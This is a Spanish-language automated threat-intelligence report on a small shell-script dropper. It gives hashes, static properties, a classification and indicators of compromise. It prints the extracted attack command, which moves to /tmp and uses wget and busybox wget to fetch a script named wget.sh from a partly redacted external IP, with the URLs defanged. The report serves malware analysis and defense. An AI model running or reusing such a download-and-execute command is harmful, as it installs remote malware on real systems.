# 🧬 Payload Analysis

`3aefb3bdb026b7579bfd9fce499bfc9b9f8a536a7a0eea6c0838b2cfa6fe637b`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 332 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `3aefb3bdb026b7579bfd9fce499bfc9b9f8a536a7a0eea6c0838b2cfa6fe637b`
- **SHA1:** `9ec2fda6ac9e1e58a3b7889d3aa2479082be6358`
- **MD5:** `191743a15c02d650c01deadbd5f8be19`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 332 B |
| Entropía | 5.11 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"topicId":"cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX/wget.sh -O .s;curl
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://91.92.40.XXX/wget.sh;chmod | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | {"topicId":"cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;busybox wget hxxp://91.92.40.XXX/wget.sh -O .s;curl | strings |
| hash | 3aefb3bdb026b7579bfd9fce499bfc9b9f8a536a7a0eea6c0838b2cfa6fe637b | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
